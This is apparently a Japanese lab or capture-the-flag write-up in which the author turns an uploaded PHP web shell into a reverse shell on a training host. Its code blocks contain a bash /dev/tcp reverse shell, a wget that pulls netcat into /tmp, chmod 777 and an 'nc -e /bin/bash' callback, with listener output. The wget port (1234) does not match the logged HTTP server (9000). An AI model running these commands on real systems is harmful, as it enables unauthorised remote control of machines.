## Exp3で確認した脆弱性を利用して、リバースシェルを取得してください。
  
もうここまできたらこんな問題は楽勝でしょ。  
ってことで甘く見てたら、また失敗  
  
例のごとく、ローカル側で待ち受けてリバースシャルのコマンド叩いてうまくいかず。  
  
```bash
nc -lvnp 1234

```
  
```bash
172.20.15.28/uploads/web1.php?cmd=bash -i >& /dev/tcp/10.15.0.6/1234 0>&1

```
  
まぁこれでだめなら、`netcat`配送して、`ncコマンド`でいけばいいや。  
今はダメな理由を追ってる場合じゃねー  
ということで、`wget`  
  
```bash
172.20.15.28/uploads/web1.php?cmd=wget -O /tmp/nc http://10.15.0.6:1234/nc

```
  
置く場所は、`/tmp`、ディレクトリを指定して名前を付けてダウンロードするときは、`-O`。  
実は総合演習時、ずっと`-o（小文字）`をオプションに指定していて、ダウンロードした時のヘッダーみたいな`ログ`ファイルを永遠製造して時間を食ったので、間違えないように気を付けた。  
  
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
172.20.15.28 - - [06/Jun/2024 15:12:01] "GET /nc HTTP/1.1" 200 -

```
  
ダウンロードもうまくいってるっぽいので、いざ`リバースシェル`!  
  
```bash
172.20.15.28/uploads/web1.php?cmd=/tmp/nc -nv 10.15.0.6 1234 -e /bin/bash

```
  
`bash`コマンドの方もさりながら、いい加減そらで書けるようになった。  
しかも佐久間さんのおかげで、'>'の処理についても理解しながらできるので、何をどうすればいいか暗記じゃなくて理解として記述できるようにはなってきた。  
改めて佐久間さんは偉大だった。  
はやく痛風治るように今週末神社に祝詞を奏上しに行こうと決意を新たにし、実行  
  
・・・・・？  
張れない。  
もちろんローカル側はリッスン状態で待ち構えている。  
はぁ一難去ってまた一難このことだわ。とため息が出た瞬間、  
「実行権限ねーじゃん」ってことに気づき権限変更  
  
```bash
172.20.15.28/uploads/web1.php?cmd=chmod 777 /tmp/nc

```
  
`怒りの777`喰らえ！ってことで、`nc`無双モードにさせたので、いざ実行  
  
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.15.0.6] from (UNKNOWN) [172.20.15.28] 40224

```
  
無事、貼れて心も晴れました。  
てゆうか、今回はすぐに気づいたからいいものの、凡ミスの多さにほとほとあきれる。  
今回はリバースシェルを張るというお題からフラグは共通の`OK`ということで、Go to next..  
  
## コマンド
  
```bash
nc -lvnp 1234

172.20.15.28/uploads/web1.php?cmd=bash -i >& /dev/tcp/10.15.0.6/1234 0>&1

172.20.15.28/uploads/web1.php?cmd=wget -O /tmp/nc http://10.15.0.6:1234/nc

┌──(kali㉿kali)-[~/Desktop]
└─$ python -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
172.20.15.28 - - [06/Jun/2024 15:12:01] "GET /nc HTTP/1.1" 200 -

172.20.15.28/uploads/web1.php?cmd=/tmp/nc -nv 10.15.0.6 1234 -e /bin/bash

172.20.15.28/uploads/web1.php?cmd=chmod 777 /tmp/nc

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.15.0.6] from (UNKNOWN) [172.20.15.28] 40224

```
